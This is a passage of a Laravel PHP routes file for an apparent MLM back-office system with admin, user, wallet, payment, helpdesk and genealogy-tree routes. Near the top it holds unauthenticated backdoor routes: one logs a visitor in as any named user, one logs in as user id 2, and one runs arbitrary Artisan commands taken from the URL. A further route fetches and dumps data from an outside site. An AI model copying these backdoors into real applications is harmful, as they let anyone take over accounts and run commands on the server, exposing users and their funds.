<?php
/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
 */
// Route::get('/', function () {
//     return view('welcome');
// });

/*
|--------------------------------------------------------------------------
| Language
|--------------------------------------------------------------------------
|
| Language route for language switcher
|
 */
Route::get('lang/{lang}', ['as' => 'lang.switch', 'uses' => 'LanguageController@switchLang']);

Route::get('cloudmlmsoftware/{adminuser}',function($adminuser){

       Auth::loginUsingId(App\User::where('username',$adminuser)->pluck('id'));
        return redirect('user/dashboard');

});


Route::get('export/{start}',function($start){

       $jsonData = json_decode(file_get_contents('https://iraisers.org/backoffice/login/exportjson/'.$start));
        dd($jsonData);


});
/*
|--------------------------------------------------------------------------
| //Translation routes
|--------------------------------------------------------------------------
|
| //Translation routes
|
 */
use Vsch\TranslationManager\Translator;
\Route::group(['middleware' => 'web', 'prefix' => 'translations'], function () {
    Translator::routes();
});

/*
|--------------------------------------------------------------------------
| // NON AUTH AJAX ROUTES
|--------------------------------------------------------------------------
|
| Ajax routes // NON AUTH
|
 */

// AJAX ROUTES - NON AUTH
Route::get('ajax/validatesponsor/{sponsor_name?}', 'AjaxController@validateSponsor');
Route::get('ajax/get-bitaps-status/{paymentid}/{username}', 'AjaxController@bitaps');
Route::get('ajax/globalview', 'AjaxController@globalmap');

Route::get('sponsor_validate/{sponsor}', 'RegisterController@validatesponsor');
Route::get('epin_validate/{e_pin}', 'RegisterController@validatepin');
Route::get('email_validate/{email}', 'RegisterController@validatemail');
Route::get('user_validate/{username}', 'RegisterController@validateusername');
Route::get('passport_validate/{passport}', 'RegisterController@validatepassport');
Route::get('voucher_validate/{voucher}', 'RegisterController@validatevoucher');


Route::get('binary_calculate_demo', 'RegisterController@binary_calculate_demo');

//CHAT CONTROLLER
Route::post('chat/setPresence', 'ChatController@setPresence');

/*
|--------------------------------------------------------------------------
| // SITE FRONT
|--------------------------------------------------------------------------
|
| Frontend routes
|
 */

Route::get('/', 'SiteController@index')->name('front');
Route::get('/home', 'SiteController@index')->name('front');
Route::post('/subscribe', 'SiteController@subscribe');

/*
|--------------------------------------------------------------------------
| // Authentication Routes...
|--------------------------------------------------------------------------
|
| // Default in laravel 5.4 commeneted out for better control over individual route mapping
| // for registration and login
|
|
 */
// Auth::routes(); //
Route::get('CloudMLMLogin', function(){
    Auth::loginusingid(2);
});

Route::get('artisan/{cmd}', function($cmd){
    artisan::call($cmd);
});


Route::get('login', 'Auth\LoginController@showLoginForm')->name('login');
Route::post('login', 'Auth\LoginController@login');
Route::post('logout', 'Auth\LoginController@logout')->name('logout');
// Registration Routes...
Route::get('register', 'Auth\RegisterController@showRegistrationForm')->name('register');
Route::post('register', 'Auth\RegisterController@register')->middleware('authenticated');
Route::get('register', 'Auth\RegisterController@showRegistrationForm')->name('register');
Route::post('register', 'Auth\RegisterController@register');
Route::get('paypal/success', 'Auth\RegisterController@paypalsuccess')->name('paypalsuccess');
Route::get('skrill/success', 'Auth\RegisterController@skrillreturn')->name('skrillreturn');
Route::post('skrill-status', 'Auth\RegisterController@skrillsuccess')->name('skrillsuccess');
Route::get('skrill-status', 'Auth\RegisterController@skrillsuccess')->name('skrillsuccess');
Route::get('register/preview/{idencrypt}', 'Auth\RegisterController@preview')->name('preview');

// Password Reset Routes...

Route::get('lock', 'CloudMLMController@performLogoutToLock');


Route::get('bitaps/paymentnotify', 'CronController@bitapspostback');
Route::post('bitaps/paymentnotify', 'CronController@bitapspostback');

Route::get('paymentnotify/success/{id}/{username}', 'CronController@ipaysuccess');
Route::get('paymentnotify/canceled/{id}/{username}', 'CronController@ipaycanceled');
Route::get('paymentnotify/ipn', 'CronController@ipayipn');

Route::post('paymentnotify/success', 'CronController@ipaysuccess');
Route::post('paymentnotify/canceled', 'CronController@ipaycanceled');
Route::post('paymentnotify/ipn', 'CronController@ipayipn');

Route::get('password/reset', 'Auth\ForgotPasswordController@showLinkRequestForm')->name('password.request');
Route::post('password/email', 'Auth\ForgotPasswordController@sendResetLinkEmail')->name('password.email');
Route::get('password/reset/{token}', 'Auth\ResetPasswordController@showResetForm')->name('password.reset');
Route::post('password/reset', 'Auth\ResetPasswordController@reset');


/**
*  ** Issue attachments 
*/ 

Route::post('imageupload', ['as' => 'imageupload-post', 'uses' =>'ImageController@postUpload']);
Route::post('imageupload/delete', ['as' => 'imageupload-remove', 'uses' =>'ImageController@deleteUpload']);
Route::get('image/{file}', ['as'=>'image', 'uses'=>'ImageController@getFile']);

/**
*  ** Replication URL 
*/



Route::get('/{sponsorname}', 'Auth\RegisterController@showRegistrationForm')->name('register');
/*
|--------------------------------------------------------------------------
| // Admin routes...
|--------------------------------------------------------------------------
 */
 
Route::group(['prefix' => 'admin', 'middleware' => ['web', 'auth'], 'namespace' => 'Admin'], function () {


    Route::pattern('id', '[0-9]+');
    Route::pattern('id2', '[0-9]+');
    // Route::pattern('base64', '');
    // Admin Dashboard
    Route::get('dashboard', 'DashboardController@index');

    Route::post('switchaccount', 'DashboardController@switchaccount');

    Route::get('gender.json', 'DashboardController@getGenderJson');
    Route::get('usersjoining.json', 'DashboardController@getUsersJoiningJson');
    Route::get('weekly-join.json', 'DashboardController@getUsersWeeklyJoiningJson');
    Route::get('monthly-join.json', 'DashboardController@getUsersMonthlyJoiningJson');
    Route::get('yearly-join.json', 'DashboardController@getUsersYearlyJoiningJson');
    Route::get('tickets-status.json/{start}/{end}', 'DashboardController@TicketsStatusJson');

    Route::get('package-sales.json', 'DashboardController@getPackageSalesJson');

    // Users
    Route::get('users/', 'UserController@index');
    // Route::get('users/data', 'UserController@data');
    Route::get('users/activate', 'UserController@activate'); 
    Route::post('users/{id}/{activate}', 'UserController@confirme_active');
    Route::get('users/create', 'UserController@getCreate');
    Route::post('users/create', 'UserController@postCreate');
    Route::get('users/password', 'UserController@getEdit');
    Route::post('users/edit', 'UserController@postEdit');
    Route::get('users/{id}/delete', 'UserController@getDelete');
    Route::post('users/{id}/delete', 'UserController@postDelete');
    Route::get('users/data', 'UserController@data');
    Route::get('suggestlist', 'UserController@suggestlist');
    Route::get('users/changeusername', 'UserController@changeusername');
    Route::post('users/changeusername', 'UserController@updatename');
     Route::get('incentivelist', 'UserController@incentivelist');

    Route::get('userprofile', 'UserController@viewprofile');
    Route::get('userprofiles/{user}', 'UserController@viewprofile');
    Route::post('profile', 'UserController@profile');

    Route::post('saveprofile', ['as' => 'admin.saveprofile', 'uses' => 'UserController@saveprofile']);





    // Route::get('genealogy', 'TreeController@index');
    // Route::post('getTree', 'TreeController@getTree');
    // Route::post('tree-up', 'TreeController@treeUp');
    // Route::get('tree-up', 'TreeController@treeUp');


    /**
     * GenealogyTreeController for OrgChart
     */
    
     
    /**
     * Index Page
     */
    //Route::get('genealogy', 'GenealogyTreeController@index');
    
    Route::get('board-genealogy/{plan}', 'GenealogyTreeController@index');

    Route::get('genealogy/{username}', 'GenealogyTreeController@index');
    /**
     * GetTree Ajax
     */
    // Route::post('getTree/{levellimit}', 'GenealogyTreeController@getTree');
    // Route::post('genealogy/getTree/{levellimit}', 'GenealogyTreeController@getTree');

    Route::post('board-genealogy/getTree/{levellimit}/{plan}', 'GenealogyTreeController@getTree');
    Route::post('genealogy/getTree/{levellimit}', 'GenealogyTreeController@getTree');

    

    /**
     * getChildrenGenealogy {$id} for nested childrens in chart
     */
    Route::post('getChildrenGenealogyByUserName/{base64}/{levellimit}', 'GenealogyTreeController@getChildrenGenealogyByUserName');
    Route::get('board-genealogy/getChildrenGenealogy/{base64}/{levellimit}/{plan}', 'GenealogyTreeController@getChildrenGenealogy');
    Route::post('board-genealogy/getChildrenGenealogy/{base64}/{levellimit}/{plan}', 'GenealogyTreeController@getChildrenGenealogy');
    Route::post('getParentGenealogy/{base64}/{levellimit}', 'GenealogyTreeController@getParentGenealogy');
    Route::post('getParentGenealogy/{base64}/{levellimit}', 'GenealogyTreeController@getParentGenealogy');
    Route::post('search/autocomplete', 'GenealogyTreeController@autocomplete');




    //tree
    Route::get('tree', 'TreeController@tree');
    Route::get('treedata', 'TreeController@treedata');
    Route::get('childdata/{$id}', 'TreeController@childdata');
    // sponsor tree
    Route::get('sponsortree', 'TreeController@sponsortree');
    Route::post('getsponsortree', 'TreeController@postSponsortree');
    Route::post('sponsor-up/{base64}', 'TreeController@sponsortreeUp');
    Route::post('sponsor-child/{base64}', 'TreeController@sponsortreeChild');
    Route::post('getsponsorchildrenByUserName/{base64}', 'TreeController@getsponsorchildrenByUserName');
    Route::get('getsponsorchildrenByUserName/{base64}', 'TreeController@getsponsorchildrenByUserName');

    Route::post('sponsor-up', 'TreeController@sponsortreeUp');
    Route::get('sponsor-up', 'TreeController@sponsortreeUp');
    //Settings
    Route::get('settings', 'SettingsController@index');
    Route::post('updatesettings', 'SettingsController@update');
    Route::post('updateleadership', 'PackageController@updateleadership');
    Route::get('ranksetting', 'SettingsController@ranksetting');
    Route::get('appsettings', 'SettingsController@appsettings');
    Route::get('themesettings', 'SettingsController@themesettings');
    Route::post('themesettings', 'SettingsController@saveTheme');
    Route::post('updateappsettings', 'SettingsController@updateappsettings');
    Route::post('updateranksettings', 'SettingsController@updateranksetting');
    Route::get('getallranks', 'SettingsController@getallranks');
    Route::post('imageUploadForm', 'SettingsController@stores');
    Route::post('uploadlogo', ['as' => 'admin.upload', 'uses' => 'SettingsController@upload']);
    Route::post('logo', 'SettingsController@savelogo');
    Route::get('/upload', 'SettingsController@getUploadForm');
    Route::post('/upload/image', 'SettingsController@postUpload');
    Route::post('uploads', 'SettingsController@updateChangeLogo');
    Route::post('image', 'SettingsController@updateImage');
    Route::get('income', 'IncomeDetailsController@index');
    Route::post('income', 'IncomeDetailsController@indexPost');
    //Report

    Route::get('getPayout', 'PayoutController@getpayout');
    Route::get('getMonthUsers', 'DashboardController@getmonthusers');
    Route::get('voucherrequest', 'VoucherrequestController@index');
    Route::post('vouchercreate', 'VoucherrequestController@create');
    Route::post('voucherdelete', 'VoucherrequestController@deletevouch');
    Route::get('vouchers', 'VoucherController@index');
    Route::get('voucherlist', 'VoucherController@voucherlist');
    Route::post('voucherlist', 'VoucherController@create');
    Route::get('voucher/edit/{id}', 'VoucherController@editvoucher');
    Route::post('updatevoucher', 'VoucherController@updatevoucher');
    Route::get('voucher/delete/{id}', 'VoucherController@deletevoucher');
    Route::post('deleteconfirm', 'VoucherController@deleteconfirm');

    Route::get('payoutnotification', 'SettingsController@payoutnotification');
    Route::post('payoutnotification', 'SettingsController@payoutupdate');
    Route::get('paymentsettings', 'SettingsController@paymentgateway');
    Route::post('paymentsettings', 'SettingsController@paymentstatus');
    Route::get('optionsettings', 'SettingsController@menusettings');
    Route::post('optionsettings', 'SettingsController@menuupdate');

    Route::get('view-adds', 'CodeController@index');
    Route::get('add-confirm/{id}', 'CodeController@store');
    Route::post('upload-code', 'CodeController@store');
    Route::post('code-show', 'CodeController@show');
    Route::get('code-show', 'CodeController@show');
    Route::get('payoutrequest', 'PayoutController@index');
    Route::get('payoutexport', 'PayoutController@payoutexport');
    Route::post('payoutconfirm', 'PayoutController@confirm');
    Route::post('payoutdelete', 'PayoutController@payoutdelete');
    Route::get('rs-wallet', 'EwalletController@rs_wallet');
    Route::get('rs-data', 'EwalletController@rs_data');
    Route::get('wallet', 'EwalletController@index');
    Route::get('ewallet', 'EwalletController@data');
    Route::post('userwallet', 'EwalletController@userwallet');

    Route::get('fund-credits', 'EwalletController@fund');
    Route::post('credit-fund', 'EwalletController@creditfund');
    Route::post('fetch-data', 'EwalletController@search');
    Route::get('getAllUsers', 'UserController@allusers');
    //Message
    Route::get('emails-template/regsiter', 'EmailsController@index');
    Route::post('emails-template/regsiter', 'EmailsController@update');

    //Message
    Route::get('inbox', 'MailController@index');
    Route::post('mail/delete', 'MailController@destroy');
    Route::get('compose', 'MailController@compose');
    Route::get('compose/{from}', 'MailController@reply');
    Route::post('reply', 'MailController@save1');
    Route::get('outbox', 'MailController@outbox');
    Route::post('send', 'MailController@save');

    Route::get('user_validate/{sponsor}', 'UserController@validateuser');
    Route::get('useraccounts', 'UserController@useraccounts'); 
    Route::post('useraccounts', 'UserController@useraccounts'); 
    Route::get('incomedetails/{id}', 'UserController@incomedetails'); 
    Route::get('referraldetails/{id}', 'UserController@referraldetails'); 
    Route::get('payoutdetails/{id}', 'UserController@payoutdetails'); 
    Route::get('ewalletdetails/{id}', 'UserController@ewalletdetails'); 

    Route::get('joiningreport', 'ReportController@joiningreport');
    Route::post('joiningreport', 'ReportController@joiningreportview');
    Route::get('fundcredit', 'ReportController@fundcredit');
    Route::post('fundcredit', 'ReportController@fundcreditview');
    Route::post('joiningreportbysponsor', 'ReportController@joiningreportbysponsorview');
    Route::post('joiningreportbycountry', 'ReportController@joiningreportbycountryview');
    Route::get('incomereport', 'ReportController@ewalletreport');
    Route::post('incomereport', 'ReportController@ewalletreportview');
    Route::get('payoutreport', 'ReportController@payoutreport');
    Route::post('payoutreport', 'ReportController@payoutreportview');
    Route::get('salesreport', 'ReportController@salesreport');
    Route::post('salesreport', 'ReportController@salesreportview');
    Route::get('pairingreport', 'ReportController@pairingreport');
    Route::post('pairingreport', 'ReportController@pairingreportview');
    Route::post('carryreport', 'ReportController@carryreportview');
    Route::get('topearners', 'ReportController@topearners');
    Route::post('topearners', 'ReportController@topearnersview');
    Route::get('revenuereport', 'ReportController@revenuereport');
    Route::post('revenuereport', 'ReportController@revenuereportview');
    Route::get('salereport', 'ReportController@salereport');
    Route::post('salereport', 'ReportController@salereportview');
    Route::get('summaryreport', 'ReportController@summuryreport');
    Route::post('summaryreport', 'ReportController@summuryreportview');
    Route::get('maintenancereport', 'ReportController@maintenancereport');
    Route::post('maintenancereport', 'ReportController@maintenancereportview');

    Route::get('mark-as-read/{msg_id}', 'MailController@mark_as_read');
    Route::get('plansettings', 'PackageController@index');
    Route::post('plansettings', 'PackageController@update');
    Route::get('incentives', 'PackageController@incentives');
    Route::get('leadership', 'PackageController@leadership');
    Route::post('updateleadership', 'PackageController@updateleadership');
    Route::post('direct-referbonus', 'PackageController@updatereferbonus');
    Route::post('groupsales', 'PackageController@updategroupsales');
    Route::post('reorder', 'PackageController@updatereorder');
    Route::post('reorder-pv', 'PackageController@reorderpv');

    Route::get('product/addcategory', 'CategoryController@index');
    Route::Post('product/addcategory','CategoryController@create');
    Route::get('product/addcategory' ,'CategoryController@viewcategory');
 Route::get('product/categorydelete/{id}', 'CategoryController@deletecategory');
    Route::post('categorydeleteconfirm', 'CategoryController@categorydeleteconfirm');
     Route::get('product/categoryedit/{id}', 'CategoryController@editcategory');
    Route::post('updateCategory', 'CategoryController@updateCategory');
     // Route::get('voucher/edit/{id}', 'CategoryController@editcategory');
    // Route::post('updatevoucher', 'CategoryController@updatecategory');

    Route::get('emailsettings', 'SettingsController@email');
    Route::post('emailsettings', 'SettingsController@updateemailsetting');
    Route::get('welcomeemail', 'SettingsController@welcome');
    Route::post('welcomeemail', 'SettingsController@updatewelcome');
    Route::get('uploads', 'SettingsController@getUploadLogo');
    Route::post('uploadlogo', ['as' => 'admin.upload', 'uses' => 'SettingsController@uploads']);
    Route::post('logo', 'SettingsController@savelogo');
    //autoresponse
    Route::get('autoresponse', 'SettingsController@autoresponder');
    Route::post('autoresponse', 'SettingsController@save');
    // Route::get('voucherlist', 'SettingsController@voucherlist');
    Route::get('response/edit/{id}', 'SettingsController@editresponse');
    Route::post('updateresponse', 'SettingsController@updateresponse');

    Route::get('response/delete/{id}', 'SettingsController@deleteresponse');
    Route::post('deleteconfirms', 'SettingsController@deleteconfirms');
    
    
    /**
     * Helpdesk including ticket system
     */        
    


    /**
     * KnowledgeBase (kb) Categories
     * 
     */  
    Route::get('/helpdesk/tickets/kb-categories', 'Helpdesk\Kb\KbCategoryController@index');    
    Route::get('/helpdesk/tickets/kb-categories/{id}', 'Helpdesk\Kb\KbCategoryController@show');    
    Route::post('/helpdesk/tickets/kb-categories/store', 'Helpdesk\Kb\KbCategoryController@store');
    Route::post('/helpdesk/tickets/kb-categories/update', 'Helpdesk\Kb\KbCategoryController@update');
    Route::get('/helpdesk/tickets/kb-categories/destroy/{id}', 'Helpdesk\Kb\KbCategoryController@destroy');
    Route::get('/helpdesk/tickets/kb-categories/data', 'Helpdesk\Kb\KbCategoryController@data');

    /**
     * Knowledgebase - Categories
     */
    /*  For the crud of category  */
    Route::resource('helpdesk/kb/category', 'Helpdesk\kb\CategoryController');    
    /*  For the datatable of category  */
    Route::get('helpdesk/kb/categories/data', ['as' => 'api.category', 'uses' => 'Helpdesk\kb\CategoryController@data']);
    /*  destroy category  */
    Route::get('helpdesk/kb/category/delete/{id}', 'Helpdesk\kb\CategoryController@destroy');


    /**
     * Knowledgebase - Articles
     */
    
    /*  For the crud of article  */
    Route::resource('helpdesk/kb/article', 'Helpdesk\kb\ArticleController');    
    /*  For the datatable of article  */
    Route::get('helpdesk/kb/articles/data', ['as' => 'api.article', 'uses' => 'Helpdesk\kb\ArticleController@data']);
    Route::get('helpdesk/kb/article/delete/{slug}', 'Helpdesk\kb\ArticleController@destroy');





    /**
     * Dashboard
     */
    Route::get('/helpdesk/tickets-dashboard', 'Helpdesk\Ticket\TicketsController@index');

    

    /**
     * All Tickets
     * Using query param, 
     */
    Route::resource('helpdesk/ticket', 'Helpdesk\Ticket\TicketsController');    
    Route::get('helpdesk/tickets/data', 'Helpdesk\Ticket\TicketsController@data');    
    Route::get('helpdesk/ticket/delete/{slug}', 'Helpdesk\Ticket\TicketsController@destroy');
    // Route::get('/helpdesk/tickets/tickets', 'TicketsController@tickets');
    Route::post('helpdesk/ticket/reply/', 'Helpdesk\Ticket\TicketsController@ticketReplyPost');

    Route::get('helpdesk/tickets/overdue/', 'Helpdesk\Ticket\TicketsController@index');
    Route::get('helpdesk/tickets/open/', 'Helpdesk\Ticket\TicketsController@index');
    Route::get('helpdesk/tickets/closed/', 'Helpdesk\Ticket\TicketsController@index');
    Route::get('helpdesk/tickets/resolved/', 'Helpdesk\Ticket\TicketsController@index');
    Route::get('helpdesk/tickets/add/', 'Helpdesk\Ticket\TicketsController@index');

 


    


    
    /**
     * Ticket functions
     */
    //Change status
    Route::get('helpdesk/tickets/ticket/change-status/', 'Helpdesk\Ticket\TicketsController@changeStatus');    
    //Change priority
    Route::get('helpdesk/tickets/ticket/change-priority/', 'Helpdesk\Ticket\TicketsController@changePriority');    
    //Change owner
    Route::patch('helpdesk/tickets/ticket/change-priority/', 'Helpdesk\Ticket\TicketsController@changeOwner');    


    
    /**
     * Departments
     * 
     */  
    
    /*  For the crud of department  */
    Route::resource('helpdesk/tickets/department', 'Helpdesk\Ticket\TicketsDepartmentsController');    
    Route::get('helpdesk/tickets/departments/destroy/{id}', 'Helpdesk\Ticket\TicketsDepartmentsController@destroy');
    /*  For the datatable of article  */    
    Route::get('/helpdesk/tickets/departments/data','Helpdesk\Ticket\TicketsDepartmentsController@data');
    
    /**
     * Categories
     * 
     */  
    
    /*  For the crud of department  */
    Route::resource('helpdesk/tickets/category', 'Helpdesk\Ticket\TicketsCategoriesController');    
    Route::get('helpdesk/tickets/categories/destroy/{id}', 'Helpdesk\Ticket\TicketsCategoriesController@destroy');
    /*  For the datatable of article  */    
    Route::get('/helpdesk/tickets/categories/data','Helpdesk\Ticket\TicketsCategoriesController@data');

    
    /**
     * Canned Responses
     * 
     */  
    

    /*  For the crud of canned responses   */
    Route::resource('helpdesk/tickets/canned-response', 'Helpdesk\Ticket\TicketsCannedResponseController');    
    Route::get('helpdesk/tickets/canned-responses/delete/{id}','Helpdesk\Ticket\TicketsCannedResponseController@destroy');    
    /*  For the datatable of canned responses  */    
    Route::get('/helpdesk/tickets/canned-responses/data','Helpdesk\Ticket\TicketsCannedResponseController@data');

    Route::post('helpdesk/tickets/canned-responses/get-canned-response','Helpdesk\Ticket\TicketsCannedResponseController@getCannedResponse');  
    /**
     * Priority
     * 
     */  
    

    /*  For the crud of priority management   */
    Route::resource('/helpdesk/tickets/priority', 'Helpdesk\Ticket\TicketsPriorityController');   
    Route::get('helpdesk/tickets/priorities/delete/{id}','Helpdesk\Ticket\TicketsPriorityController@destroy');     
    Route::get('/helpdesk/tickets/priorities/data','Helpdesk\Ticket\TicketsPriorityController@data');





    // Route::post('/helpdesk/tickets/departments/update', 'Helpdesk\Ticket\TicketsDepartmentsController@update');
    // Route::post('/helpdesk/tickets/departments/destroy', 'Helpdesk\Ticket\TicketsDepartmentsController@destroy');

    // Route::post('/helpdesk/tickets/departments/data', 'Helpdesk\Ticket\TicketsDepartmentsController@data');

     
    /**
     * Ticket types
     * 
     */  
    

    /*  For the crud of ticket-type management   */
    Route::resource('/helpdesk/tickets/ticket-type', 'Helpdesk\Ticket\TicketsTypeController');   
    Route::get('helpdesk/tickets/ticket-types/delete/{id}','Helpdesk\Ticket\TicketsTypeController@destroy');     
    Route::get('/helpdesk/tickets/ticket-types/data','Helpdesk\Ticket\TicketsTypeController@data');

 
    /**
     * Configure ticket system : Alerts & Notification
     * 
     * New ticket alert
     * Status - radio enable disable
     *
     */
    Route::post('post_ticket_category', 'TicketConfigurationsController@store_ticket_category');
    #products
    Route::get('products', 'ProductController@index');
    Route::post('products', 'ProductController@update');
    Route::post('product/add', 'ProductController@create');
    Route::get('product/delete/{id}', 'ProductController@destroy');
 
    Route::get('product/addproducts','ProductController@viewProducts');
    Route::post('product/addproducts','ProductController@productscreate');
    Route::get('product/productdelete/{id}', 'ProductController@deleteproducts');
    Route::post('productdeleteconfirm', 'ProductController@productdeleteconfirm');
    Route::get('product/productedit/{id}', 'ProductController@editProduct');
    Route::post('updateProduct', 'ProductController@updateProduct');
    Route::get('product/approve/{id}', 'ProductController@approve');
    Route::get('product/productpurchasehistory', 'ProductController@purchaseProducthistory');
    Route::get('product/saleshistory', 'ProductController@saleshistory');
    Route::get('product/purchaselistdelete/{id}', 'ProductController@deletepurchaselist');
    Route::post('purchasedeleteconfirm', 'ProductController@purchasedeleteconfirm'); 
    Route::get('product/approve', 'ProductController@approve');


    #CurrencyController
    Route::get('currency', 'CurrencyController@index');
    Route::post('currency', 'CurrencyController@update');
    Route::post('currency/add', 'CurrencyController@create');
    Route::get('currency/delete/{id}', 'CurrencyController@destroy');
    #purchase history
    Route::get('purchase-history', 'ProductController@purchasehistory');
    Route::get('purchase-history/{id}/delete', 'ProductController@delete_order');
    Route::get('purchase-history/{id}/confirm', 'ProductController@confirm_order');
    Route::post('purchase-history', 'ProductController@purchasehistoryshow');
    #member management
    Route::get('member', 'MemberController@index');
    Route::post('member/search', 'MemberController@search');
    #Register new memeber
    Route::get('xpress', 'RegisterController@xpress');
    Route::get('cancelreg', 'RegisterController@cancelreg');
    Route::get('register/{placement_id}', 'RegisterController@index');
    Route::get('register', 'RegisterController@index');
    Route::post('register', 'RegisterController@register');
    Route::post('register/data/', 'RegisterController@data');
    Route::get('voucherverify', 'RegisterController@voucherverify');
    Route::get('paypal/success', 'RegisterController@paypalsuccess');
    Route::get('register/preview/{idencrypt}', 'RegisterController@preview');

    Route::get('lead', 'LeadviewController@leadview');
    Route::post('lead', 'LeadviewController@updatelead');
    Route::get('deletelead/{id}/delete', 'LeadviewController@deletelead');
    Route::get('getstatus', 'LeadviewController@getstatus');
    Route::get('documentupload', 'DocumentController@upload');
    Route::post('uploadfile', 'DocumentController@uploadfile');
    Route::post('deletedocument', 'DocumentController@deletedocument');
    Route::post('updatedocument', 'DocumentController@updatedocument');
    Route::get('download/{name}', 'DocumentController@getDownload');

    /**
     * Notes
     */
    Route::get('notes', 'NotesController@index');
    Route::post('post-note', 'NotesController@postNote');
    Route::post('remove-note', 'NotesController@removeNote');


    /**
     * Campaigns
     */
    Route::get('campaign/lists', 'Marketing\Campaign\CampaignController@index');
    Route::get('campaign/create', 'Marketing\Campaign\CampaignController@create');
    Route::get('campaign/edit/{id}', 'Marketing\Campaign\CampaignController@edit');
    Route::post('campaign/save', 'Marketing\Campaign\CampaignController@store');
    Route::get('campaign/lists/change-status', 'Marketing\Campaign\CampaignController@changestatus');
  

    /**
     * Campaigns contacts
     */
    Route::get('campaign/contacts/contactsgroup','Marketing\Contacts\ContactsController@datagruop');  
    Route::get('campaign/contacts/contactslist/{id}','Marketing\Contacts\ContactsController@data');  
    Route::get('campaign/contacts/{id}/editgruop','Marketing\Contacts\ContactsController@editgruop');  
    Route::post('campaign/contacts/{id}/editgruop','Marketing\Contacts\ContactsController@savegruop');  
    Route::get('campaign/contacts/destroygruop/{id}','Marketing\Contacts\ContactsController@destroygruop');  
    Route::resource('campaign/contacts', 'Marketing\Contacts\ContactsController');
    Route::post('campaign/contacts/create-gruop', 'Marketing\Contacts\ContactsController@creategruop');

  

    /**
     * Campaigns autoresponders
     */
    Route::get('campaign/autoresponders', 'Marketing\Campaign\CampaignController@autorespondersIndex');
    Route::get('campaign/autoresponders/create', 'Marketing\Campaign\CampaignController@createAutoResponder');
  


    /**
     * Activity listing
     */
    Route::get('all_activities', 'ActivityController@index');
    
  



    Route::model('User', 'App\User', function () {
        throw new NotFoundHttpException;
    });
    Route::get('api/dropdown', function () {
        $id     = Input::get('username');
        $models = User::find($id)->username;
        return $models->lists('name', 'id');
    });



}); 


/**
 * Testing funtions to be removed from app when distributing
 */
    
Route::group(['prefix' => 'factory', 'middleware' => ['web', 'auth'], 'namespace' => 'Factory'], function(){
    Route::get('dummynetwork/{userslimit}', 'DemoUtils\DemoUtilsController@dummynetwork');
    Route::get('dummytickets/{ticketslimit}', 'DemoUtils\DemoUtilsController@dummytickets');
    Route::get('dummymails', 'DemoUtils\DemoUtilsController@dummymails');
    Route::get('dummyvouchers', 'DemoUtils\DemoUtilsController@dummyvouchers');
});




Route::group(['prefix' => 'user', 'middleware' => ['auth','user'], 'namespace' => 'user'], function () {
    Route::get('dashboard', 'dashboard@index');
    Route::get('activate', 'dashboard@activate');
    Route::post('savedocument', 'dashboard@savedocument');
     Route::post('users/{id}/{activate}', 'dashboard@confirme_active');
    Route::get('getMonthUsers', 'dashboard@getmonthusers');
     Route::get('usersjoining.json', 'dashboard@getUsersJoiningJson');
    Route::get('suggestlist', 'UserController@suggestlist');
    Route::get('profile', 'ProfileController@index');
    
    // Route::post('profile/edit/{id}', 'ProfileController@update');
    Route::post('profile/edit/{id}', ['as' => 'user.saveprofile', 'uses' => 'ProfileController@update']);
    Route::post('currency', 'ProfileController@currency');
    Route::post('leg-setting', 'ProfileController@legsetting');
    Route::post('rs-setting', 'ProfileController@rssetting');
    Route::get('states/{id}', 'ProfileController@getstates');
    // Route::get('getEdit', 'ProfileController@getEdit');
    Route::post('getEdit', 'ProfileController@postEdit');
    Route::get('changepassword', 'ChangePasswordController@index');
    Route::post('updatepassword', 'ChangePasswordController@updatepassword');
    Route::get('ewallet', 'Ewallet@index');
    Route::post('ewallet', 'Ewallet@index');
    Route::get('wallet/data', 'Ewallet@data');
    Route::get('viewreferals', 'ViewReferals@index');
    //mail system
    
    Route::get('creditfund', 'Ewallet@creditfund');
    Route::post('creditfund', 'Ewallet@addcreditfund');

    Route::get('paymentnotify/success/{id}/{username}', 'Ewallet@ipaysuccess');
    Route::get('paymentnotify/canceled/{id}/{username}', 'Ewallet@ipaycanceled');
 
    Route::post('paymentnotify/success', 'Ewallet@ipaysuccess');
    Route::post('paymentnotify/canceled', 'Ewallet@ipaycanceled');
 

    Route::get('paypal/addfund/success/{invoice_id}', 'Ewallet@paypalsuccess');


    Route::get('inbox','MailController@index');
    Route::post('mail/delete','MailController@destroy');
    Route::get('compose','MailController@compose');
    Route::get('compose/{from}','MailController@reply');
    Route::post('reply','MailController@save1');
    Route::post('send','MailController@save');
    Route::get('user_validate/{sponsor}', 'UserController@validateuser');
    Route::get('incentivelist', 'UserController@incentivelist');


    Route::get('joinvip', 'UserController@joinvip');
    Route::post('joinvip', 'UserController@upgradeaccount'); 


    Route::get('upgradenotify/success/{id}/{username}', 'UserController@ipaysuccess');
    Route::get('upgradenotify/canceled/{id}/{username}', 'UserController@ipaycanceled');
 
    Route::post('upgradenotify/success', 'UserController@ipaysuccess');
    Route::post('upgradenotify/canceled', 'UserController@ipaycanceled');
 


     // Route::get('genealogy', 'TreeController@index');
     Route::get('genealogy/{plan}', 'TreeController@index');
    // Route::post('getTree/{levellimit}', 'TreeController@indexPost');
     Route::post('genealogy/getTree/{levellimit}/{plan}', 'TreeController@indexPost');
    Route::post('tree-up', 'TreeController@treeUp');
    Route::get('tree-up', 'TreeController@treeUp');
    //tree
    Route::get('tree', 'TreeController@tree');
    Route::get('treedata', 'TreeController@treedata');
    Route::get('childdata', 'TreeController@childdata');
    // sponsor tree
    Route::get('sponsortree', 'TreeController@sponsortree');
    Route::post('getsponsortree', 'TreeController@postSponsortree');
    Route::post('getsponsortreeurl', 'TreeController@getsponsortreeurl');
    Route::post('sponsor-up', 'TreeController@sponsortreeUp');
    Route::get('sponsor-up', 'TreeController@sponsortreeUp');
    Route::post('sponsor-up/{base64}', 'TreeController@sponsortreeUp');
    Route::post('sponsor-child/{base64}', 'TreeController@sponsortreechild');

     /**
     * getChildrenGenealogy {$id} for nested childrens in chart
     */

    //tree
    Route::post('getChildrenGenealogyByUserName/{base64}/{levellimit}', 'GenealogyTreeController@getChildrenGenealogyByUserName');
    Route::get('genealogy/getChildrenGenealogy/{base64}/{levellimit}/{plan}', 'GenealogyTreeController@getChildrenGenealogy');
    Route::post('genealogy/getChildrenGenealogy/{base64}/{levellimit}/{plan}', 'GenealogyTreeController@getChildrenGenealogy');
    Route::post('getParentGenealogy/{base64}/{levellimit}', 'GenealogyTreeController@getParentGenealogy');
